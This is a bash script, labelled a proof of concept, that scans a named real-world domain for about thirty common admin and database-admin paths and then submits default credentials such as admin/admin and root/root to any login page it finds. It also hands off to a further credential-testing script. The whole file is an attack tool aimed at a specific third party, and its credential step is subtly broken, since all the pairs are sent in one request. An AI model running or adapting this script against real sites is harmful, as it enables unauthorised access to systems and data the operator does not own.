#!/bin/bash
# Admin Panel Exposure PoC

echo "[*] Testing admin panel access..."

admin_panels=(
    "admin"
    "administrator"
    "sysadmin"
    "adminpanel"
    "panel"
    "cpanel"
    "whm"
    "webadmin"
    "siteadmin"
    "adminarea"
    "admincp"
    "cp"
    "controlpanel"
    "dashboard"
    "backend"
    "manage"
    "management"
    "admin/login"
    "administrator/login"
    "login/admin"
    "admin/index.php"
    "admin/dashboard"
    "admin/panel"
    "phpmyadmin"
    "pma"
    "myadmin"
    "phpMyAdmin"
    "mysqladmin"
    "pgadmin"
    "adminer"
    "phpPgAdmin"
)

echo "[*] Checking admin panel accessibility..."
for panel in "${admin_panels[@]}"; do
    url="https://stockity.com/$panel"
    response=$(curl -s -L -o /dev/null -w "%{http_code}" "$url")
    
    if [ "$response" == "200" ] || [ "$response" == "301" ] || [ "$response" == "302" ]; then
        echo "[✓] ACCESSIBLE: $url ($response)"
        
        # Get page title to confirm
        title=$(curl -s -L "$url" | grep -o "<title>[^<]*" | head -1 | sed 's/<title>//')
        echo "    Title: $title"
        
        # Check for login form
        if curl -s -L "$url" | grep -qi "password\|login\|signin\|admin"; then
            echo "    [!] Login form detected - attempting default credentials..."
            
            # Test default credentials
            curl -s -X POST "$url" \
                -d "username=admin&password=admin" \
                -d "username=admin&password=password123" \
                -d "username=administrator&password=administrator" \
                -d "username=root&password=root" \
                -H "Content-Type: application/x-www-form-urlencoded" \
                -w "%{http_code}" -o /dev/null
        fi
    else
        echo "[ ] Not accessible: $url ($response)"
    fi
done

# Test for default credentials on found panels
echo "[*] Testing default credentials on admin panels..."
./test-default-creds.sh
